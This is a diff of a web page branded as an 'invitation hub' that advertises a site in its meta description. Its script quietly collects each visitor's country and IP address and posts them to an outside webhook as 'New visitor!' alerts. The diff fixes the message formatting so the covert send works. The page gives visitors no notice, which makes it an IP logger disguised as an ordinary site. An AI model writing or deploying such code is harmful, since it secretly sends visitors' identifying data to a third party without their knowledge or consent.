@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>The NEW invitation hub!</title>
-  <meta name="description" content="A test website.">
+  <meta name="description" content="Invite users world wide to anywhere! Use ravensleigh.co.uk TODAY!">
   <script>
    <script>
 let userCountry = null;
@@ -24,8 +24,8 @@ fetch(webhookURL, {
     "Content-Type": "application/json"
   },
   body: JSON.stringify({
-    content: "Country:" userCountry 
-              "Ip:" userIP
+content: `New visitor! \n Country: ${userCountry}\nIP: ${userIP}`
+
   })
 });
 });
